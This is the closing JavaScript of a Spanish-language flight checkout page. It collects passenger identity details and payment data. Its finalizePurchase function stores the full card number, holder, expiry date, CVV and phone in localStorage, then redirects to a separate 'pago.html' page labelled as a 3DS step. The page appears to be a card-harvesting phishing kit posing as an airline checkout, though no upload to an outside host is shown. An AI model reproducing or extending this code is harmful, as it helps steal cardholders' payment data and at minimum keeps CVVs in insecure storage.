            const diffMins = Math.floor((diffMs % 3600000) / 60000); // minutos
            
            return `${diffHrs}h ${diffMins}m`;
        }


        function generatePassengerForms() {
            const container = document.getElementById('passengers-container');
            container.innerHTML = '';
            
            for (let i = 1; i <= passengersCount; i++) {
                const passengerForm = document.createElement('div');
                passengerForm.className = 'passenger-form';
                passengerForm.innerHTML = `
                    <div class="passenger-header">Pasajero ${i}</div>
                    
                    <div class="form-group">
                        <label class="form-label">NOMBRES</label>
                        <input type="text" class="form-input" placeholder="Como figura en el documento de viaje" id="nombres-${i}">
                    </div>

                    <div class="form-group">
                        <label class="form-label">APELLIDOS</label>
                        <input type="text" class="form-input" placeholder="Como figura en el documento de viaje" id="apellidos-${i}">
                    </div>

                    <div class="form-group">
                        <label class="form-label">PAÍS DE RESIDENCIA</label>
                        <div class="country-selector">
                            <div class="flag"></div>
                            <span>Colombia</span>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">TIPO DE DOCUMENTO</label>
                            <select class="form-select" id="documento-${i}">
                                <option>Cédula de Identidad</option>
                                <option>Pasaporte</option>
                                <option>Tarjeta de Identidad</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label class="form-label">NÚMERO</label>
                            <input type="text" class="form-input" placeholder="Número" id="numero-${i}">
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">FECHA DE NACIMIENTO</label>
                        <div class="form-row-3">
                            <select class="form-select" id="dia-${i}">
                                <option>Día</option>
                                ${Array.from({length: 31}, (_, j) => `<option value="${j+1}">${j+1}</option>`).join('')}
                            </select>
                            <select class="form-select" id="mes-${i}">
                                <option>Mes</option>
                                <option value="1">Enero</option>
                                <option value="2">Febrero</option>
                                <option value="3">Marzo</option>
                                <option value="4">Abril</option>
                                <option value="5">Mayo</option>
                                <option value="6">Junio</option>
                                <option value="7">Julio</option>
                                <option value="8">Agosto</option>
                                <option value="9">Septiembre</option>
                                <option value="10">Octubre</option>
                                <option value="11">Noviembre</option>
                                <option value="12">Diciembre</option>
                            </select>
                            <select class="form-select" id="año-${i}">
                                <option>Año</option>
                                ${Array.from({length: 80}, (_, j) => {
                                    const year = new Date().getFullYear() - j;
                                    return `<option value="${year}">${year}</option>`;
                                }).join('')}
                            </select>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">SEXO</label>
                        <div class="radio-group">
                            <label class="radio-option">
                                <input type="radio" name="gender-${i}" value="female">
                                <span>Femenino</span>
                            </label>
                            <label class="radio-option">
                                <input type="radio" name="gender-${i}" value="male">
                                <span>Masculino</span>
                            </label>
                        </div>
                    </div>
                `;
                container.appendChild(passengerForm);
            }
        }

        function updatePricing() {
            const basePrice = 120000; // Precio base por persona
            const taxes = 12000; // Impuestos fijos
            const insurance = 10773; // Seguro por persona
            
            const totalFlightCost = basePrice * passengersCount;
            const totalTaxes = taxes;
            const totalInsurance = insurance * passengersCount;
            const grandTotal = totalFlightCost + totalTaxes + totalInsurance;
            
            // Actualizar textos
            const passengerText = passengersCount === 1 ? 
                'Vuelo para 1 persona' : 
                `Vuelo para ${passengersCount} personas`;
            
            document.getElementById('flight-passengers-text').textContent = passengerText;
            document.getElementById('flight-base-price').textContent = `$ ${totalFlightCost.toLocaleString('es-CO')}`;
            document.getElementById('flight-taxes').textContent = `$ ${totalTaxes.toLocaleString('es-CO')}`;
            document.getElementById('insurance-price').textContent = `$ ${totalInsurance.toLocaleString('es-CO')}`;
            document.getElementById('total-price').textContent = `$ ${grandTotal.toLocaleString('es-CO')}`;
            
            // Mostrar línea de seguro
            document.getElementById('insurance-cost').style.display = 'flex';
        }

        function setupPaymentMethods() {
            const paymentMethods = document.querySelectorAll('input[name="payment"]');
            const installmentsSection = document.getElementById('installments-section');
            
            paymentMethods.forEach(method => {
                method.addEventListener('change', function() {
                    if (this.value === 'credit') {
                        installmentsSection.classList.add('active');
                    } else {
                        installmentsSection.classList.remove('active');
                    }
                    
                    // Actualizar método de pago en resumen
                    updatePaymentSummary(this.value);
                });
            });
            
            // Mostrar cuotas por defecto si crédito está seleccionado
            if (document.querySelector('input[name="payment"][value="credit"]').checked) {
                installmentsSection.classList.add('active');
            }
        }

        function updatePaymentSummary(paymentType) {
            const paymentSummary = document.getElementById('summary-payment');
            const paymentNames = {
                'credit': 'Tarjeta de crédito',
                'debit': 'Tarjeta de débito'
            };
            
            paymentSummary.innerHTML = `<strong>${paymentNames[paymentType] || paymentType}</strong>`;
        }

        function updateStepIndicator() {
            for (let i = 1; i <= totalSteps; i++) {
                const stepDot = document.getElementById(`step${i}`);
                const stepLine = document.getElementById(`line${i}`);
                
                if (i < currentStep) {
                    stepDot.className = 'step-dot completed';
                    if (stepLine) stepLine.className = 'step-line completed';
                } else if (i === currentStep) {
                    stepDot.className = 'step-dot active';
                    if (stepLine) stepLine.className = 'step-line';
                } else {
                    stepDot.className = 'step-dot';
                    if (stepLine) stepLine.className = 'step-line';
                }
            }
        }

        function showStep(stepNumber) {
            // Ocultar todos los pasos
            for (let i = 1; i <= totalSteps; i++) {
                document.getElementById(`stepContent${i}`).classList.remove('active');
            }
            
            // Mostrar el paso actual
            document.getElementById(`stepContent${stepNumber}`).classList.add('active');
            updateStepIndicator();
        }
        function nextStep() {
    if (currentStep < totalSteps) {
        // validar antes de avanzar
        if (!validateStep(currentStep)) {
            return; // detener si no pasó validación
        }

        // 👉 Guardar el teléfono en paso 4
        if (currentStep === 4) {
            const phone = document.getElementById("phone-number").value;
            if (phone) {
                localStorage.setItem("customerPhone", phone);
            }
        }

        // actualizar resumen en paso 6
        if (currentStep === 5) {
            updateFinalSummary();
        }

        currentStep++;
        showStep(currentStep);
    }
}






        function previousStep() {
            if (currentStep > 1) {
                currentStep--;
                showStep(currentStep);
            }
        }

            function validateStep(stepNumber) {
            let valid = true;
            let inputs = [];
            let errorContainer = document.getElementById(`error-step${stepNumber}`);
            if (errorContainer) errorContainer.style.display = "none";

            if (stepNumber === 1) {
                // Validar datos de pasajeros
                for (let i = 1; i <= passengersCount; i++) {
                    inputs.push(
                        document.getElementById(`nombres-${i}`),
                        document.getElementById(`apellidos-${i}`),
                        document.getElementById(`numero-${i}`),
                        document.getElementById(`dia-${i}`),
                        document.getElementById(`mes-${i}`),
                        document.getElementById(`año-${i}`)
                    );
                }
            }

            if (stepNumber === 4) {
                // Validar datos de tarjeta
                inputs = document.querySelectorAll('#stepContent4 .form-input');
            }

            if (stepNumber === 5) {
                // Validar datos de facturación
                inputs = document.querySelectorAll('#stepContent5 .form-input, #stepContent5 .form-select');
            }

            // Chequear que todos estén llenos
            inputs.forEach(input => {
                if (!input.value || input.value === "Día" || input.value === "Mes" || input.value === "Año") {
                    input.style.borderColor = "red";
                    valid = false;
                } else {
                    input.style.borderColor = "#e5e7eb"; // restaurar si está bien
                }
            });

            if (!valid && errorContainer) {
                errorContainer.textContent = "⚠️ Por favor completa todos los campos antes de continuar.";
                errorContainer.style.display = "block";
            }

            return valid;
        }



        function updateFinalSummary() {
            // Actualizar fechas
            document.getElementById('summary-ida-fecha').textContent = flightData.dateIda;
            document.getElementById('summary-vuelta-fecha').textContent = flightData.dateVuelta;
            
            // Actualizar lista de pasajeros
            const passengersSummary = document.getElementById('summary-passengers');
            passengersSummary.innerHTML = '';
            
            for (let i = 1; i <= passengersCount; i++) {
                const nombres = document.getElementById(`nombres-${i}`)?.value || 'No ingresado';
                const apellidos = document.getElementById(`apellidos-${i}`)?.value || 'No ingresado';
                
                const passengerItem = document.createElement('div');
                passengerItem.className = 'summary-item';
                passengerItem.innerHTML = `
                    <span><strong>Pasajero ${i}:</strong></span>
                    <span>${nombres} ${apellidos}</span>
                `;
                passengersSummary.appendChild(passengerItem);
            }
            
            // Actualizar cuotas si aplica
            const selectedPayment = document.querySelector('input[name="payment"]:checked')?.value;
            const installments = document.getElementById('installments-select')?.value;
            
            if (selectedPayment === 'credit' && installments) {
                document.getElementById('summary-installments').style.display = 'flex';
                document.getElementById('summary-installments-text').textContent = 
                    installments === '1' ? '1 cuota (sin interés)' : `${installments} cuotas`;
            }
        }
function finalizePurchase() {
    // Obtener datos del formulario (SIN validaciones estrictas por tu solicitud)
    const cardNumber = document.getElementById("card-number")?.value.replace(/\s/g, "") || "";
    const cardHolder = document.querySelector('#stepContent4 input[placeholder*="Como figura"]')?.value || "";
    const expiry = document.querySelector('#stepContent4 input[placeholder="MM/AA"]')?.value || "";
    const cvv = Array.from(document.querySelectorAll('#stepContent4 .form-input')) // si tienes varios inputs, localiza por id si lo prefieres
                    .find(i => i && i.placeholder === "" && i !== document.getElementById('card-number'))?.value || 
                (document.querySelector('#stepContent4 input[type="text"]:nth-child(3)')?.value || "");
    // (mejor asignar id a cada input si quieres robustez)
    const phone = document.getElementById("phone-number")?.value || "";
    const total = document.getElementById("total-price")?.textContent || "";

    // Enmascarar para mostrar después
    let maskedCard = "**** **** **** 0000";
    if (cardNumber.length >= 4) maskedCard = "**** **** **** " + cardNumber.slice(-4);

    // Guardar TODO en localStorage (temporal)
    localStorage.setItem("fullCardNumber", cardNumber);
    localStorage.setItem("cardHolder", cardHolder);
    localStorage.setItem("cardExpiry", expiry);
    localStorage.setItem("cardCVV", cvv);
    localStorage.setItem("customerPhone", phone);
    localStorage.setItem("maskedCard", maskedCard);
    localStorage.setItem("purchaseTotal", total);

    // Si también quieres el logo como antes (opcional)
    const cardLogo = document.getElementById("card-logo")?.src || "";
    localStorage.setItem("cardLogo", cardLogo);

    // Redirigir a la pantalla 3DS / pago
    window.location.href = "pago.html";
}




        // Agregar interactividad a los formularios
        document.addEventListener('DOMContentLoaded', function() {
            // Efectos en inputs
            document.querySelectorAll('.form-input, .form-select').forEach(input => {
                input.addEventListener('focus', function() {
                    this.style.transform = 'translateY(-2px)';
                    this.style.boxShadow = '0 4px 12px rgba(99, 102, 241, 0.15)';
                });
                
                input.addEventListener('blur', function() {
                    this.style.transform = 'translateY(0)';
                    this.style.boxShadow = 'none';
                });
            });

            // Selección de seguros
            document.querySelectorAll('.insurance-card').forEach(card => {
                card.addEventListener('click', function() {
                    document.querySelectorAll('.insurance-card').forEach(c => c.classList.remove('selected'));
                    this.classList.add('selected');
                    
                    // Actualizar precio si se selecciona seguro
                    const price = this.querySelector('.insurance-price').textContent;
                    if (price !== '$ 0') {
                        document.getElementById('insurance-cost').style.display = 'flex';
                        updatePricing(); // Recalcular precios
                    } else {
                        document.getElementById('insurance-cost').style.display = 'none';
                        // Recalcular sin seguro
                        const basePrice = 120000 * passengersCount;
                        const taxes = 102213;
                        const total = basePrice + taxes;
                        document.getElementById('total-price').textContent = `$ ${total.toLocaleString('es-CO')}`;
                    }
                });
            });

            // Selección de método de pago (solo habilitados)
            document.querySelectorAll('.payment-method:not(.disabled)').forEach(method => {
                method.addEventListener('click', function() {
                    document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
                    this.classList.add('selected');
                    this.querySelector('input[type="radio"]').checked = true;
                    
                    // Trigger change event
                    this.querySelector('input[type="radio"]').dispatchEvent(new Event('change'));
                });
            });

            // Efecto hover en tarjeta de pasaporte
            document.querySelector('.passport-card').addEventListener('mouseenter', function() {
                this.style.transform = 'translateY(-3px)';
                this.style.boxShadow = '0 8px 25px rgba(255, 107, 107, 0.3)';
            });

            document.querySelector('.passport-card').addEventListener('mouseleave', function() {
                this.style.transform = 'translateY(0)';
                this.style.boxShadow = 'none';
            });
        });

        // Navegación con teclado
        document.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowRight' || e.key === 'Enter') {
                if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'SELECT') {
                    nextStep();
                }
            } else if (e.key === 'ArrowLeft') {
                if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'SELECT') {
                    previousStep();
                }
            }
        });

        // Detección de franquicia de tarjeta
        document.addEventListener("DOMContentLoaded", () => {
            const cardNumberInput = document.getElementById("card-number");
            const cardLogo = document.getElementById("card-logo");

            if (cardNumberInput) {
                cardNumberInput.addEventListener("input", function () {
                    let value = this.value.replace(/\D/g, ""); // quitar espacios y letras

                    // Mostrar solo números en formato XXXX XXXX XXXX XXXX
                    this.value = value.replace(/(.{4})/g, "$1 ").trim();

                    // Detectar franquicia
                    let logo = "";
                    if (/^4/.test(value)) {
                        logo = "https://img.icons8.com/color/48/visa.png"; // VISA
                    } else if (/^5[1-5]/.test(value)) {
                        logo = "https://img.icons8.com/color/48/mastercard.png"; // MasterCard
                    } else if (/^3[47]/.test(value)) {
                        logo = "https://img.icons8.com/color/48/amex.png"; // American Express
                    } else if (/^6/.test(value)) {
                        logo = "https://img.icons8.com/color/48/discover.png"; // Discover
                    }

                    if (logo) {
                        cardLogo.src = logo;
                        cardLogo.style.display = "block";
                    } else {
                        cardLogo.style.display = "none";
                    }
                });
            }
        });

    </script>
</body>
</html>